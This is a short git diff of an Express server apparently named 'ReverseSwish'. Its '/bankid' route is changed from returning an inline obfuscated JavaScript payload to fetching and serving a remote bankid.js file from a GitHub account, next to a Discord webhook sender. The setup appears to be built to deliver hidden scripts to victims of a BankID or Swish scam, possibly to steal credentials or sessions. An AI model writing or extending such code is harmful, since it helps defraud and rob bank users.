@@ -14,10 +14,18 @@ app.get("/", (req, res) => {
   res.send("ReverseSwish is running! 🚀");
 });
 
-app.get("/bankid", (req, res) => {
-  res.send('(function(_0x64fdc1, _0x4f0f45) { function _0x12fcb2(_0x3a6f81, _0xd3bad, _0xc92464, _0x2b8103) { return _0x2240(_0x3a6f81 - 0x28b, _0xd3bad); } const _0x2b899d = _0x64fdc1(); function _0x12527d(_0x9b4732, _0x4519c7, _0x35a067, _0x17fbf6) { return _0x2240(_0x17fbf6 - 0x1dd, _0x9b4732); } while (!![]) { try { const _0x42bc58 = pa');
+app.get("/bankid", async (req, res) => {
+  try {
+    // Fetch the content of bankid.js from GitHub
+    const response = await axios.get('https://raw.githubusercontent.com/lunarxploit/swosa/master/bankid.js');
+    
+    // Send the fetched JavaScript content as the response
+    res.send(response.data);
+  } catch (error) {
+    console.error("Error fetching bankid.js:", error);
+    res.status(500).send("Error fetching bankid.js");
+  }
 });
-
 
   // Function to send Discord webhook
 async function sendDiscordWebhook(embed) {
